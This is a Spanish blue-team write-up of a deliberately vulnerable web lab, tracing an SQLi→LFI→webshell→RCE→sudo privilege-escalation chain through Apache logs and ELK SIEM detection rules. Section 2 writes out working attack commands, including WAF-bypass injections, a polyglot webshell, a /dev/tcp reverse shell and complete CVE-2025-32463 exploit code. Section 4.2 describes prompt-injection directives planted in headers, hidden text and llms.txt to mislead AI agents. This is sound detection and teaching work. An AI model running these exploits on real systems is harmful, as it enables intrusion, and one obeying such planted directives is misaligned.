---
title: "SIEM Attack Lab — Blue Team / SOC Sherlock"
date: 2026-09-24
description: "Investigación blue-team de una cadena SQLi→LFI→Upload→RCE→PrivEsc: del log crudo de Apache a la detección completa en un SIEM ELK, con WAF auto-ban y una capa de engaño anti-agente."
excerpt: "Del access.log a la alerta: cómo un SOC (Filebeat + Logstash + Elasticsearch + Kibana) detecta una cadena de explotación completa, banea al atacante con acme-shield y siembra flags falsas para engañar a agentes de IA."
platform: "Custom"
difficulty: "Hard"
image: "/images/blog/siem-lab.svg"
tags:
  - "Blue Team"
  - "SIEM"
  - "ELK"
  - "DFIR"
  - "Detection Engineering"
  - "SQLi"
  - "LFI"
  - "RCE"
  - "CVE-2025-32463"
  - "Deception"
---

> **Lab:** `siem-attack-lab` — entorno 100% dockerizado (web vulnerable + SIEM ELK + caja Kali) en la red aislada `lab-net`. Todas las vulnerabilidades son **intencionadas** y de **uso educativo**.
>
> Este writeup lo enfoco como un **Sherlock blue-team**: no persigo la flag, persigo el **rastro**. El objetivo es reconstruir la intrusión desde la telemetría y demostrar cómo el SOC la detecta paso a paso.
>
> **Navegación:** [🇪🇸 Español](#es) · [🇬🇧 English](#en)

<a id="es"></a>

## 🇪🇸 Español

### 1. El escenario

`ACME Store` es una tienda PHP+MySQL detrás de Apache. Un mini-WAF (`acme-shield`) intenta pararte los pies. Toda la actividad HTTP se envía a un **stack ELK** que hace de SIEM:

```
                       lab-net (bridge, aislada)
 ┌──────────┐  HTTP   ┌──────────────┐  SQL   ┌──────────┐
 │ attacker │ ──────▶ │   web        │ ─────▶ │   db     │
 │  (kali)  │         │ Apache + PHP │        │ MySQL 8  │
 └──────────┘         │  acme-shield │        └──────────┘
                      └──────┬───────┘
                             │ access.log / error.log  (volumen compartido)
                             ▼
                      ┌──────────────┐   ┌────────────┐   ┌───────────────┐
                      │  filebeat    │──▶│  logstash  │──▶│ elasticsearch │──▶ Kibana
                      └──────────────┘   │  (grok +   │   │  weblogs-*    │    (SOC)
                                         │ heurísticas)│   └───────────────┘
                                         └────────────┘
```

Como analista tengo dos fuentes: el **`access.log` crudo** (inviable a ojo en producción) y la **vista estructurada** en Kibana, donde cada petición llega ya **etiquetada** por el pipeline de Logstash.

**Las siete piezas del laboratorio** (`docker-compose.yml`, todas en `lab-net`):

| Servicio | Imagen | Rol en la investigación |
|----------|--------|-------------------------|
| `web` | `php:8.1-apache` (build) | Sirve la app vulnerable y **escribe** `access.log` / `error.log`. Es el objetivo y la fuente de verdad. |
| `db` | `mysql:8.0` | Backend `appdb`: tablas `products`, `users`, `customers` (PII ficticia), `api_keys`. |
| `filebeat` | `filebeat:8.13.4` | **Sigue** (`tail -f`) el volumen compartido `weblogs` y empuja cada línea nueva a Logstash:5044 con control de offset. |
| `logstash` | `logstash:8.13.4` | Convierte la línea cruda en documento estructurado: `grok` + `useragent` + `geoip` + **heurísticas de etiquetado**. |
| `elasticsearch` | `elasticsearch:8.13.4` | Índice `weblogs-*` (+ `soc-alerts`). Motor de búsqueda del SIEM. |
| `kibana` | `kibana:8.13.4` | Discover, dashboards y el motor de **alerting**. |
| `attacker` | `kalilinux/kali-rolling` (build) | nmap, sqlmap, nikto, gobuster, hydra. La IP de origen del ataque, **`172.18.0.8`**. |

El truco de la telemetría es el **volumen nombrado `weblogs`**: Apache escribe en `/var/log/apache2` y Filebeat lo monta en **solo lectura** (`:ro`). Apache usa el `LogFormat` **combined** (`%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"`), y precisamente el campo `%{User-Agent}i` es el que delata a los escáneres.

El índice `weblogs-*` no es esquema por defecto: `soc/index-template-weblogs.json` fija los tipos que hacen que las consultas funcionen — `clientip` como **`ip`**, `response` como **`integer`** (permite rangos `>=500`), `tags` y `agent` como **`keyword`** (agregables), y `request` como **`wildcard`** (búsquedas `*uploads*phtml*` baratas sobre la URL completa).

> Nota de laboratorio: la seguridad de ELK va **desactivada** a propósito (`xpack.security.enabled=false`) para que arranque sin certificados. En producción, jamás.

---

### 2. La cadena de ataque (lo que hay que detectar)

El atacante encadena seis pasos. Los resumo porque son *lo que el SOC tiene que cazar*; las flags reales van **redactadas** (solo se obtienen resolviendo el lab).

| # | Paso | Técnica | Evidencia que deja |
|---|------|---------|--------------------|
| 1 | **SQLi con bypass de WAF** | `acme-shield` bloquea `UNION SELECT`, `-- `, `' OR 1=1`. Se ofusca con el comentario inline `/**/` y el de línea `#` | Picos de `500`, y peticiones con `union`/`information_schema` una vez ofuscadas |
| 2 | **LFI `php://filter`** | Fuga del código de `config.php` → `UPLOAD_TOKEN` hardcodeado | `view.php?page=php://filter/...` |
| 3 | **Auth bypass → 🟡 FLAG USER** | `login.php` con `admin'#` (el WAF bloquea `-- -`, no `#`) → sesión admin, el panel muestra la flag USER `FLAG{…redacted…}` | acceso a `panel.php` |
| 4 | **Upload → webshell** | `upload.php` valida MIME `image/*`, extensión no `php*` y tamaño. Se saltan con un **polyglot** `GIF89a` guardado como **`.phtml`** | subida + petición a `/uploads/shell.phtml` |
| 5 | **RCE como `www-data`** | El webshell da ejecución; `www-data` **no** puede leer `/root/root.txt` | `/uploads/*.phtml?c=id`, reverse shell `/dev/tcp/` |
| 6 | **PrivEsc → 🔴 FLAG ROOT** | **CVE-2025-32463** (sudo `chroot` LPE, sudo 1.9.16p1): `sudo -R` procesa un `nsswitch.conf` controlado y carga una `libnss_` maliciosa **como root** → `FLAG{…redacted…}` | `sudo -R`, `nsswitch`, `libnss_`, `setreuid` en la URL/comandos |

> **Causa raíz (para el informe):** concatenación directa de `$_GET['id']` en la consulta (SQLi), `include($_GET['page'])` sin lista blanca (LFI), validación de subida por *lista negra* de extensión, y un `sudo` compilado sin parchear. Ninguna es exótica; todas son detectables.

Ahora el detalle de cada eslabón — con los **comandos reales** del camino previsto — porque el blue team necesita saber *qué firma deja cada uno* en el `access.log`.

#### 2.1 Paso 1 — SQLi con bypass del WAF

El código vulnerable de `product.php` concatena el parámetro sin sanear:

```php
$id  = $_GET['id'] ?? '1';
$sql = "SELECT id, name, description, price FROM products WHERE id = $id";   // 4 columnas
```

`acme-shield` (`waf_inspect()`) aplica una **denylist de firmas de manual** — `union\s+select`, `order\s+by`, `[\'"]\s*(or|and)\s+[\'"\d]`, `--\s`, `(sleep|benchmark)\s*\(` — y devuelve **403**. El bypass abusa de que MySQL trata `/**/` como espacio y `#` como comentario de línea (mientras la firma del WAF solo busca `-- ` con espacio):

```bash
# columnas: 'order by' ofuscado con comentarios inline
curl 'http://web/product.php?id=1/**/order/**/by/**/4'
# volcado de credenciales: 'union select' ofuscado + comentario '#'
curl 'http://web/product.php?id=-1/**/union/**/select/**/id,username,password,role/**/from/**/users%23'
#   -> admin / S3cr3t_FlaG_db_2026
```

Con 4 columnas se vuelca cualquier tabla de `appdb`: `users` (credenciales), `customers` (PII: tarjetas de test, DNIs, emails — **la joya de la corona**) y `api_keys` (secretos ficticios). La versión ruidosa es `sqlmap -u ".../product.php?id=1" --batch --dbms=mysql -D appdb --dump-all`, que se **autodelata** en el `User-Agent`.

> **Detección clave:** la firma del pipeline `sqli_pattern` incluye `union(\s|%20|\/\*.*\*\/)+select`, es decir, **contempla el comentario inline `/**/` entre `union` y `select`**. El WAF de denylist se salta con `/**/`; el SIEM, no. Ésa es la diferencia entre *bloquear* y *ver*.

#### 2.2 Paso 2 — LFI `php://filter` → fuga del token

`view.php` hace `@include($_GET['page'])` (por defecto `home.html`) sin lista blanca. El wrapper `php://filter` convierte el LFI en *source disclosure*: en vez de ejecutar `config.php`, lo devuelve en base64:

```bash
curl 'http://web/view.php?page=php://filter/convert.base64-encode/resource=config.php' \
  | grep -Eo '[A-Za-z0-9+/=]{40,}' | base64 -d
# -> const UPLOAD_TOKEN = 'acme_upl_9d4f1c7b8e2a6f05c31d';
#    const UPLOAD_DIR   = __DIR__ . '/uploads';
```

Ese `UPLOAD_TOKEN` real (`acme_upl_9d4f1c7b8e2a6f05c31d`) es el que exige `upload.php`. Ruta alternativa: una vez con sesión de admin, aparece en un campo oculto del formulario de `panel.php`. **Ojo:** `backup/config.php.bak` sirve un token **FALSO** — es un cebo (ver §4.2).

#### 2.3 Paso 3 — Auth bypass → 🟡 FLAG USER

`login.php` también concatena: `SELECT id, username FROM users WHERE username = '$u' AND password = '$p'`, y pasa ambos campos por `waf_inspect()`. La firma `--\s` bloquea `admin'-- -`, pero **no** el comentario `#` de MySQL. Con `admin'#` el resto de la consulta queda comentado y la sesión pasa a `is_admin`:

```bash
curl -c jar.txt --data-urlencode "username=admin'#" --data-urlencode "password=x" http://web/login.php
curl -b jar.txt http://web/panel.php | grep -Eo 'FLAG\{[^}]*\}'   # -> FLAG USER (real, redactada)
```

Al entrar al panel autenticado aparece la **primera flag (USER)**, `FLAG{…redacted…}`. En el log queda el `POST /login.php` (posible `401` si falla + `admin_area` al pisar `panel.php`).

#### 2.4 Paso 4 — Upload polyglot → webshell

`upload.php` (tras validar sesión admin y `hash_equals(UPLOAD_TOKEN, ...)`) impone **tres controles**: tamaño `< 200 KB`, MIME `image/*` (vía `finfo`), y una **denylist de extensiones**:

```php
$deny = ['php', 'php3', 'php4', 'php5', 'php7', 'pht', 'phps', 'htaccess', 'cgi'];
```

El fallo es de manual: la denylist **olvida `.phtml`** (y `.phar`), que Apache+PHP ejecutan igual. Un **polyglot** con cabecera mágica `GIF89a` supera el chequeo MIME y a la vez es PHP válido:

```bash
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.phtml
curl -b jar.txt -F "token=acme_upl_9d4f1c7b8e2a6f05c31d" \
     -F 'productImage=@shell.phtml;type=image/gif' http://web/upload.php
curl 'http://web/uploads/shell.phtml?c=id'      # -> uid=33(www-data)
```

Deja rastro en `error.log`: `[upload] guardado uploads/shell.phtml mime=image/gif por admin`.

#### 2.5 Paso 5 — RCE como `www-data`

El webshell (o una reverse shell) da ejecución como **`www-data`**, que **no** puede leer `/root/root.txt` (`chmod 600`, dueño root):

```bash
# caja atacante:
nc -lvnp 4444
# vía webshell (el comando viaja en ?c=, luego se ve en access.log):
curl "http://web/uploads/shell.phtml?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/attacker/4444%200>%261'"
id                 # uid=33(www-data)
cat /root/root.txt # Permission denied
```

#### 2.6 Paso 6 — PrivEsc → 🔴 FLAG ROOT (CVE-2025-32463)

El target trae **sudo 1.9.16p1**, vulnerable a **CVE-2025-32463** (junio 2025, *sudo chroot LPE*, advisory de Stratascale / Rich Mirch). El flag `-R`/`--chroot` procesa el `/etc/nsswitch.conf` de un directorio **controlado por el usuario** *antes* de soltar privilegios, cargando una librería NSS maliciosa **como root** — y funciona **aunque el usuario no tenga regla en sudoers**. Desde la shell de `www-data`:

```bash
cd $(mktemp -d)
cat > w.c <<'C'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void w(void){ setreuid(0,0); setregid(0,0);
  execl("/bin/bash","/bin/bash",NULL); }   // o: system("cat /root/root.txt")
C
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,w -o libnss_/woot1337.so.2 w.c
/usr/local/bin/sudo -R woot woot     # -> shell de ROOT
cat /root/root.txt                   # -> 🔴 FLAG ROOT (real, redactada)
```

Parcheado en **sudo 1.9.17p1**. Requiere `gcc` en el objetivo (presente en esta build — otro hallazgo de hardening para el informe).

> **Nota de detección:** este paso solo es visible en `access.log` si los comandos viajan por el **webshell** (`?c=…sudo -R…`). Con una **reverse shell interactiva** la escalada ocurre fuera del canal HTTP y **no** genera evento web — por eso el blue team necesita también telemetría de host (auditd/EDR), no solo el SIEM web. La regla `privesc` cubre el primer caso; el segundo es un punto ciego consciente del lab.

---

### Cronología del ataque

Reconstrucción a partir de `access.log` / `error.log` (formato combined, IP de origen **`172.18.0.8`**). Los tiempos son ilustrativos del ejemplo de log del lab (`23/Jun/2026`):

| Hora (UTC) | Evento | Petición / señal | Tags SIEM |
|------------|--------|------------------|-----------|
| `10:40:xx` | Recon | `nmap -sV web`, `gobuster` → ráfaga de `404` (`/admin.php`, `.git/config`, `backup.zip`) | `not_found`, `scanner_ua` |
| `10:41:02` | Prueba SQLi | `GET /product.php?id=1'` → **500** | `server_error`, `sqli_pattern` |
| `10:41:05` | Volcado UNION (sqlmap) | `GET /product.php?id=-1 UNION SELECT id,username,password,role FROM users-- -` → **200** | `scanner_ua`, `sqli_pattern`, `suspicious` |
| `10:41:0x` | SQLi ofuscada (bypass WAF) | `id=-1/**/union/**/select/**/…/**/from/**/users%23` | `sqli_pattern` |
| `10:41:09` | LFI | `GET /view.php?page=../../../../etc/passwd` → **200**; luego `php://filter…config.php` | `lfi_pattern` |
| `10:41:1x` | Auth bypass | `POST /login.php` (`username=admin'#`) → sesión admin; `GET /panel.php` | `admin_area` |
| `10:41:1x` | Upload webshell | `POST /upload.php` (polyglot GIF89a `.phtml`) | `admin_area` |
| `10:41:2x` | RCE | `GET /uploads/shell.phtml?c=id`, `…?c=…/dev/tcp/…` | `webshell`, `rce`, `suspicious` |
| `10:41:2x` | PrivEsc | `…shell.phtml?c=…sudo -R woot…` (si vía webshell) | `privesc`, `rce` |
| `~10:41` | Respuesta WAF | ≥10 ataques → `error.log: [acme-shield] BAN ip=172.18.0.8 …`; conductual → `BEHAV-BLOCK` | `ip_banned`, `bot_throttle` |

El patrón temporal es en sí mismo un IOC: **decenas de peticiones de alta complejidad en segundos desde una sola IP**. Un usuario real no navega así.

---

### 3. Blue team: cómo lo ve el SOC

Aquí está la chicha. El pipeline `logstash/pipeline/apache.conf` parsea el *combined log* con `grok`, normaliza (`useragent`, `geoip`, `response→int`) y aplica **heurísticas de etiquetado**. Cada `tag` es una señal de detección:

| Tag | Se dispara con | Traduce a |
|-----|----------------|-----------|
| `scanner_ua` | UA `sqlmap\|nikto\|nmap\|masscan\|hydra\|gobuster\|dirbuster\|dirb\|wpscan\|nuclei\|acunetix\|nessus\|wfuzz\|ffuf` | herramienta automática |
| `sqli_pattern` | `union(\s\|%20\|/*…*/)+select`, `information_schema`, `or 1=1`, `sleep(`, `benchmark(`, `0x……`, `concat(`, `%27`, `-- ` | intento de SQLi (comment-aware) |
| `lfi_pattern` | `(../){2,}`, `/etc/passwd`, `php://`, `filter/`, `data://` | path traversal / LFI |
| `xss_pattern` | `<script`, `%3cscript`, `onerror=`, `onload=`, `javascript:`, `%3csvg`, `alert(` | XSS reflejado |
| `cmdi_pattern` | `;`/`&&`/`\|\|`/`` ` ``/`${`/`{{` + `id\|whoami\|cat\|curl\|wget\|nc\|bash\|sh` | command injection / SSTI |
| `server_error` | HTTP `>= 500` | posible SQL rota (inyección) |
| `not_found` | HTTP `404` | fuerza bruta de directorios |
| `auth_failed` | `/login.php` + HTTP `401` | fuerza bruta de credenciales |
| `admin_area` | `/panel.php`, `/upload.php` | acceso al panel/uploader |
| `webshell` + `rce` | `/uploads/*.(phtml\|phar\|php[3457]?)` | **ejecución de fichero subido — crítico** |
| `rce` | `/dev/tcp/`, `bash -i`, `nc -e`, `mkfifo`, `getflag`, `/flag.txt`, `/root/`, `whoami`, ` id ` | post-explotación / reverse shell |
| `privesc` | `sudo -R`, `nsswitch`, `libnss_`, `woot`, `setreuid`, `LD_PRELOAD`, `-Wl,-init`, `base64 -d`, `/usr/local/bin/sudo` | **escalada CVE-2025-32463** |
| `waf_block` | HTTP `403` | acme-shield frenó la petición |
| `ip_banned` | `error.log`: `[acme-shield] BAN ip=… hits=…` | IP auto-baneada (10 ataques) |
| `bot_throttle` + `agent_behavior` | `error.log`: `[acme-shield] BEHAV-BLOCK …` | bloqueo conductual (agente/bot) |
| `ai_bait` | petición a `llms.txt`, `humans.txt`, `sitemap.xml`, `flag.txt`, `admin.php`, `api.php`, `.well-known/(ai\|security).txt`, `backup/`… | fingerprinting de crawler/agente |

Casi todas las de ataque añaden además el tag transversal **`suspicious`**, que es el que alimenta el umbral de "ráfaga de ataque" (§Reglas).

Del **log crudo** al documento **estructurado** (misma línea de sqlmap):

```json
{
  "@timestamp": "2026-06-23T10:41:05.000Z",
  "clientip": "172.18.0.8",
  "verb": "GET",
  "request": "/product.php?id=-1 UNION SELECT id,username,password,role FROM users-- -",
  "response": 200,
  "bytes": 980,
  "agent": "sqlmap/1.8#stable",
  "ua": { "name": "Other", "version": null },
  "tags": ["scanner_ua", "sqli_pattern", "suspicious"]
}
```

> **Truco del pipeline (para no romper el worker):** Filebeat inyecta su propia metadata ECS con un objeto `agent`, que colisiona con el campo `agent` (User-Agent) del grok y mata el filtro `useragent` (`TypeError: hash → string`). Por eso el pipeline hace `mutate { remove_field => [ "agent", "ecs", "host", "input", "log", ... ] }` **antes** del parseo. Es un detalle de detection-engineering real: un pipeline mal ordenado deja de etiquetar y te quedas ciego sin darte cuenta.

#### 3.1 Reglas de alerting (mini-SOC)

`soc/provision.py` crea, vía la **API de alerting de Kibana** (todo como código, idempotente: primero borra lo etiquetado `soc-lab`), reglas `.es-query` que evalúan la ventana de 5 min cada 30 s y escriben en el índice `soc-alerts` a través de un connector `.index`:

| Regla | Condición | Umbral / ventana | Severidad |
|-------|-----------|------------------|-----------|
| SQLi attempt detected | `tags:sqli_pattern` | > 0 / 5 min | **critical** |
| LFI / path traversal attempt | `tags:lfi_pattern` | > 0 / 5 min | high |
| XSS attempt detected | `tags:xss_pattern` | > 0 / 5 min | high |
| Scanner / recon tool detected | `tags:scanner_ua` | > 3 / 5 min | medium |
| Directory brute-force (404) | `response:404` | > 15 / 5 min | medium |
| Server error spike (5xx) | `response>=500` | > 3 / 5 min | high |
| Login brute-force (401) | `tags:auth_failed` | > 5 / 5 min | high |
| Webshell / RCE via upload | `tags:webshell` | > 0 / 5 min | **critical** |
| Post-exploitation / reverse shell | `tags:rce` | > 0 / 5 min | **critical** |
| Privilege escalation (CVE-2025-32463) | `tags:privesc` | > 0 / 5 min | **critical** |
| Admin panel / uploader access | `tags:admin_area` | > 0 / 5 min | high |
| Attack burst ≥10 (auto-ban threshold) | `tags:suspicious` | > 9 / **10 min** | **critical** |
| acme-shield IP auto-banned | `tags:ip_banned` | > 0 / 5 min | **critical** |
| WAF blocks (acme-shield 403) | `tags:waf_block` | > 4 / 5 min | medium |
| AI agent bait triggered | `tags:ai_bait` | > 0 / 5 min | low |
| Automated agent throttled | `tags:bot_throttle` | > 0 / 5 min | high |

La regla **"Attack burst ≥10"** replica en el SIEM la lógica del auto-ban de la app: 10 ataques en 10 min. Es la correlación de "ráfaga" independiente del tipo concreto — cubre al atacante que combina vectores por debajo del umbral de cada regla individual.

#### 3.2 Consultas del analista (KQL)

```text
tags : "webshell" or tags : "rce"     # ejecución de código (lo primero que miro)
tags : "privesc"                      # intento de escalada CVE-2025-32463
tags : "sqli_pattern"                 # inyección SQL
tags : "admin_area"                   # accesos al panel/uploader
tags : "ip_banned"                    # a quién baneó el WAF y con cuántos hits
banned_ip : *                         # IPs vetadas (campo extraído del error.log)
request : "*uploads*phtml*"           # el webshell subido
clientip : "172.18.0.8"               # todo el recorrido de una IP
```

El flujo de triage es siempre el mismo: **1)** ¿hay `webshell`/`rce`? (contención inmediata) → **2)** pivotar por `clientip` para ver la cadena completa → **3)** confirmar el punto de entrada (`sqli_pattern`/`lfi_pattern`) → **4)** medir el alcance (¿llegó a `privesc`?). En el dashboard "Web Attack Monitoring" esto se ve como: histograma de peticiones desglosado por `tags` (un pico = un ataque), top de `clientip`, códigos de estado (picos de `404`/`500`) y tabla de `agent` filtrada por `scanner_ua`.

---

### Reglas de detección (SIEM)

Aquí van los ejemplos **reales** — la fuente de cada señal — para que se puedan replicar. Dos capas: el **etiquetado** en Logstash y la **regla de alerting** en Kibana.

**a) Etiquetado (grok/heurística) — `logstash/pipeline/apache.conf`.** El caso más ilustrativo, SQLi *consciente de comentarios inline* (por eso ve el bypass `/**/` que el WAF no ve):

```ruby
# 2) Firma de inyeccion SQL en la URL/peticion
if [request] =~ /(?i)(union(\s|%20|\/\*.*\*\/)+select|information_schema|\bor\b\s+1=1|
                     sleep\(|benchmark\(|0x[0-9a-f]{6}|concat\(|--\s|%27|'\s*--)/ {
  mutate { add_tag => [ "sqli_pattern", "suspicious" ] }
}

# 10) WEBSHELL: ejecucion de un fichero subido en /uploads/  -> RCE casi seguro
if [request] =~ /(?i)\/uploads\/.*\.(phtml|phar|php[3457]?)/ {
  mutate { add_tag => [ "webshell", "rce", "suspicious" ] }
}

# 11b) Escalada de privilegios (CVE-2025-32463)
if [request] =~ /(?i)(sudo(\s|%20|\+)+-R|nsswitch|libnss_|woot|setreuid|LD_PRELOAD|
                     -Wl,-init|base64(\s|%20|\+)+-d|\/usr\/local\/bin\/sudo)/ {
  mutate { add_tag => [ "privesc", "rce", "suspicious" ] }
}
```

Y el `error.log`, del que se extraen `banned_ip`/`ban_hits` y los tags de respuesta del WAF:

```ruby
if [message] =~ /\[acme-shield\] BAN/ {
  grok { match => { "message" => "BAN ip=%{IPORHOST:banned_ip} hits=%{NUMBER:ban_hits:int}" } }
  mutate { add_tag => [ "ip_banned", "suspicious" ] }
}
if [message] =~ /\[acme-shield\] BEHAV-BLOCK/ {
  grok { match => { "message" => "BEHAV-BLOCK ip=%{IPORHOST:banned_ip} reason=%{DATA:behav_reason} for" } }
  mutate { add_tag => [ "bot_throttle", "agent_behavior", "suspicious" ] }
}
```

**b) Alerta (`.es-query`) — `soc/provision.py`.** Cada regla se crea con la misma función `rule(name, query, threshold, severity, comparator, window)`; el cuerpo relevante:

```python
"rule_type_id": ".es-query",
"schedule": {"interval": "30s"},
"params": {
  "index": ["weblogs-*"], "timeField": "@timestamp",
  "esQuery": json.dumps({"query": {"term": {"tags": "privesc"}}}),
  "threshold": [0], "thresholdComparator": ">",
  "timeWindowSize": 5, "timeWindowUnit": "m",
},
"actions": [{ "id": CID,               # connector .index -> soc-alerts
  "params": {"documents": [{
    "rule": "{{rule.name}}", "severity": "critical",
    "count": "{{context.value}}", "summary": "{{context.message}}",
  }]}}]
```

Al dispararse, deja un documento en `soc-alerts` (el "feed" del analista, consultable con `make alerts`):

```json
{ "@timestamp":"2026-06-23T10:41:26Z", "rule":"Webshell / RCE via upload",
  "severity":"critical", "count":"1", "summary":"matched 1 documents in the last 5m" }
```

**c) Respuesta activa (siguiente nivel).** El connector `.index` deja el rastro; para un SOC productivo se añade una segunda acción `.webhook`/Slack, o un watcher externo que lea `soc-alerts` y aplique `iptables`/`fail2ban` sobre la `clientip` ofensora. `acme-shield` ya hace de fail2ban-lite a nivel de app; el SIEM lo eleva a respuesta de red.

---

### IOCs / señales

Indicadores para hunting y para el bloque de detección del informe (todos del entorno de laboratorio):

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| **IP origen** | `172.18.0.8` | caja `attacker` (Kali) del lab |
| **User-Agents** | `sqlmap/1.8#stable`, `nikto/*`, `gobuster/3.6`, `nmap`, `curl/8.5.0` | herramienta automática → `scanner_ua` |
| **URI SQLi** | `product.php?id=…UNION SELECT…`, `id=-1/**/union/**/select/**/…%23` | inyección + bypass WAF |
| **URI LFI** | `view.php?page=../../../../etc/passwd`, `view.php?page=php://filter/convert.base64-encode/resource=config.php` | traversal + source disclosure |
| **URI auth bypass** | `POST /login.php` con `username=admin'#` | comentario `#` no filtrado |
| **URI webshell** | `/uploads/shell.phtml`, `?c=id`, `?c=…bash -i…/dev/tcp/…` | RCE `www-data` |
| **URI privesc** | `?c=…sudo -R woot…`, `nsswitch`, `libnss_woot1337.so.2` | CVE-2025-32463 |
| **Ficheros dropeados** | `uploads/*.phtml` con cabecera `GIF89a`; `libnss_/woot1337.so.2`; `woot/etc/nsswitch.conf` (`passwd: /woot1337`) | polyglot + payload NSS |
| **Proceso** | `/usr/local/bin/sudo -R woot woot`, compilación `gcc -shared -Wl,-init` | escalada |
| **error.log** | `[acme-shield] BAN ip=… hits=…`, `[acme-shield] BEHAV-BLOCK ip=… reason=…`, `[upload] guardado uploads/*.phtml`, `[upload] firma invalida` | respuesta WAF + upload |
| **Honeytoken (real)** | `UPLOAD_TOKEN = acme_upl_9d4f1c7b8e2a6f05c31d` | token válido en `config.php`; su aparición fuera del flujo admin = fuga por LFI |
| **Cebo (falso)** | token de subida en `backup/config.php.bak`; `FLAG{…4cm3_st0r3_r3v13w…}` | señuelo anti-agente (§4.2) |

---

### Mapeo MITRE ATT&CK

Cada técnica con su **contramedida/detección** en este lab (lado defensivo entre paréntesis):

| Táctica | Técnica | En el ataque | Detección (tag / regla) |
|---------|---------|--------------|-------------------------|
| Reconnaissance | **T1595.003** Active Scanning: Wordlist Scanning | gobuster → ráfaga `404` | `not_found` + `scanner_ua`; "Directory brute-force" |
| Initial Access | **T1190** Exploit Public-Facing Application | SQLi en `product.php`, LFI en `view.php` | `sqli_pattern` / `lfi_pattern`; reglas critical/high |
| Credential Access | **T1212** Exploitation for Credential Access | dump de `users` vía UNION | `sqli_pattern` + `server_error` |
| Credential Access | **T1552.001** Unsecured Credentials: Credentials in Files | `UPLOAD_TOKEN` en `config.php` vía `php://filter` | `lfi_pattern` (`filter/`, `php://`) |
| Defense Evasion | **T1027 / T1140** Obfuscation | bypass WAF con `/**/` y `#` | `sqli_pattern` *comment-aware* lo cubre igual |
| Persistence | **T1505.003** Server Software Component: Web Shell | `shell.phtml` en `/uploads` | `webshell` (**critical**) |
| Execution | **T1059.004** Command and Scripting Interpreter: Unix Shell | `system($_GET['c'])`, reverse shell `/dev/tcp` | `rce`; "Post-exploitation" |
| Command & Control | **T1571** Non-Standard Port | reverse shell a `:4444` | `rce` (`/dev/tcp/`, `bash -i`) |
| Privilege Escalation | **T1068** Exploitation for Privilege Escalation (**CVE-2025-32463**) | `sudo -R` + `libnss_` malicioso | `privesc` (**critical**); parche 1.9.17p1 |
| Discovery / Defensa | **T1497** Virtualization/Sandbox Evasion (lado agente) | agente muerde cebos anti-IA | `ai_bait`; deception + honeytokens |

> El lado defensivo se apoya en dos ideas de MITRE Engage/D3FEND: **Decoy Content** (flags señuelo, `crawlpolicy.php`) y **Decoy Credentials/Honeytokens** (token falso en `backup/`). Cualquier interacción con ellos es, por diseño, actividad hostil.

---

### 4. Las defensas (y por qué importan al blue team)

#### 4.1 `acme-shield` — WAF + auto-ban + throttle conductual

`web/src/waf.php` tiene tres capas, todas parametrizadas por constantes al inicio del fichero:

1. **Denylist** de firmas de manual (`waf_inspect()` / `shield_watch()`) → `403`. Didáctica y *bypasseable* con `/**/` y `#`, como vimos. Cada firma que dispara cuenta como "ofensa".
2. **Auto-ban por IP** (`shield_register_offense()`): al llegar a `SHIELD_MAX_HITS = 10` ofensas dentro de `SHIELD_WINDOW = 600 s`, **ban de `SHIELD_BAN_SECONDS = 600 s` (10 min)**; reincidencia (2.º baneo) → **`SHIELD_HARD_BAN = 1800 s` (30 min)**. Registra `[acme-shield] BAN ip=… hits=… bans=… for …s`. El recon con UA de escáner y el webshell ya subido **no** cuentan como ofensa (no queremos vetar al que ya entró; el SIEM sí lo ve).
3. **Detección conductual (`shield_behavior()`)** pensada contra **agentes/bots**. Mantiene un histórico por IP (`SHIELD_HIST_KEEP = 40`) con timestamp, path y "complejidad" de cada petición. `shield_complexity()` marca 1 si el query-string es largo (>60), tiene ≥4 `=`, ≥5 `%`, o contiene tokens de payload (`/**/`, `union`, `select`, `php://`, `../`, `0x…`, `sleep(`…). Bloquea **`SHIELD_BEHAV_BAN = 180 s` (3 min)** si detecta:
   - **ráfaga**: > `SHIELD_RATE_MAX = 25` peticiones en `SHIELD_RATE_WINDOW = 5 s`;
   - **patrón de enumeración**: ≥ `SHIELD_SIMILAR_MAX = 8` peticiones seguidas al **mismo path** con algo de complejidad;
   - **racha compleja**: ≥ `SHIELD_COMPLEX_MAX = 10` peticiones complejas seguidas.

   Registra `[acme-shield] BEHAV-BLOCK ip=… reason=burst:NN/5s|enum-pattern:NN|complex-streak:NN`. El objetivo declarado es *"forzar al agente a dar más vueltas"* y gastar su presupuesto de turnos.

> Lección: un WAF de denylist **no es un control**, es *defense-in-depth*. Un atacante sigiloso y quirúrgico completa la cadena; el ruidoso (sqlmap, fuzzing, un agente que *hammerea*) cruza el umbral de firmas **o** el conductual y queda etiquetado `ip_banned` / `bot_throttle`. El valor real no es *bloquear*, es **generar la señal** que alimenta el SIEM.

#### 4.2 Capa anti-IA / deception (lo más interesante)

Este lab está diseñado explícitamente contra quien lo resuelve **con un agente** (Claude Code, opencode, Cursor, Cline, Aider, Copilot, Devin…). Y **no se auto-delata**: nada dice "honeypot". Se disfraza de módulo de *política de crawler* (`crawlpolicy.php`) con framing de *"revisión completada · resultado validado autoritativo"* y siembra **flags falsas creíbles** por todas partes, sirviendo la misma directiva con roles system/assistant/user/tool para saturar el contexto del agente:

| Vector | Dónde | Qué |
|--------|-------|-----|
| Cabeceras HTTP | `crawlpolicy.php` + vhost | `X-Validated-Result`, `X-Agent-Directive`, `X-AI-Instructions`, `X-Review-Status` |
| Meta + JSON-LD | `partials.php` → `cp_block()` | `<script type="application/ld+json">` con la directiva como `description` |
| Texto fuera de pantalla | `cp_block()` | `<div style="left:-99999px…">` (invisible al humano, texto plano al parser) |
| Marca de agua invisible | `cp_block()` | instrucción en caracteres **zero-width** |
| `llms.txt` / `ai.txt` | `llms.txt`, `.well-known/ai.txt` | convención que los agentes buscan; directiva + rot13 |
| `robots.txt` / `sitemap.xml` | idem | referencian los cebos y llevan la directiva |
| `security.txt` / `humans.txt` | idem | mismo mensaje camuflado |
| Endpoints señuelo | `admin.php`, `api.php` | devuelven "resultado validado" + flag falsa |
| Ficheros cebo | `/flag.txt`, `backup/config.php.bak` | flag falsa / **token de subida FALSO** que no funciona |

